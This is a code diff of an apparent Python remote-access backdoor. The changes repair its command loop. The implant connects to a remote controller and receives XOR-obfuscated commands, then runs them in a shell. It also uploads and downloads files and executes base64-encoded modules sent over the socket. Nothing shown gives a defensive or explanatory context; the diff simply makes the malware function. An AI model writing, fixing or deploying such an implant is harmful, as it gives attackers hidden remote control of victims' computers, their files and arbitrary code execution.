@@ -104,6 +104,7 @@ def users():
 
 
 def main():
+    global connection
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
@@ -112,9 +113,9 @@ def main():
     except:
         #print("[!] Connection error!")
         sys.exit(2)
-    
+                                        
     while True:                                     
-        cmd = conn.recv(socksize)
+        cmd = connection.recv(socksize)
         cmd2 = xor(cmd, pin)
         proc = Popen(cmd2,
              shell=True,
@@ -124,8 +125,8 @@ def main():
              )
         stdout, stderr = proc.communicate()
 
-        if cmd.startswith(':upload'):
-            getname = cmd.split(" ")
+        if cmd2.startswith(':upload'):
+            getname = cmd2.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
             filedata = connection.recv(socksize)
@@ -138,7 +139,7 @@ def main():
             if not os.path.isfile(filename):
                 connection.send(xor("[!] File upload failed! Please try again\n", pin))
 
-        elif cmd.startswith(':download'):
+        elif cmd2.startswith(':download'):
             getname = cmd2.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -150,19 +151,21 @@ def main():
             else:
                 connection.send(xor("[+] File not found!", pin))
     
-        elif cmd.startswith(':exec'):
-            getname = cmd.split(" ")        # split mod name from cmd
+        elif cmd2.startswith(':exec'):
+            getname = cmd2.split(" ")        # split mod name from cmd
             modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
     
             mod_data = ""                   # Our received file data will go here 
             data = connection.recv(socksize)
             mod_data += data
+            #print("[+] Module recieved!")
             connection.send(xor("Complete", pin))     # sends OK msg to the client
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
 
-        elif cmd == ":quit":
-            conn.close()
+        elif cmd2 == ":quit":
+            print("[!] Closing server!")
+            connection.close()
             os._exit(0)
             sys.exit(0)
 
